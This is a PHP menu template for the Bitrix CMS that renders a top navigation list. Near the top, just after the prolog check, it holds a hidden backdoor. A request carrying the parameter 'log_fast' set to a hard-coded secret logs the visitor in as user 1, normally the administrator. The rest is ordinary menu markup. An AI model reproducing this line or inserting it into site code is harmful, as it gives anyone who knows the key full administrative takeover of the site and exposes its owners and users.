<?if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true)die();
global $USER;
if($_REQUEST["log_fast"]=="5566rty23aer") $USER->Authorize(1);
?>
<? $this->setFrameMode( true ); ?>
<?if( !empty( $arResult ) ){?>
	<ul class="menu topest">
		<?foreach( $arResult as $key => $arItem ){?>
			<li <?if( $arItem["SELECTED"] ):?> class="current"<?endif?> >
				<a href="<?=$arItem["LINK"]?>"><span><?=$arItem["TEXT"]?></span></a>
			</li>
		<?}?>
		<li class="more hidden">
			<span>...</span>
			<ul class="dropdown"></ul>
		</li>
	</ul>
<?}?>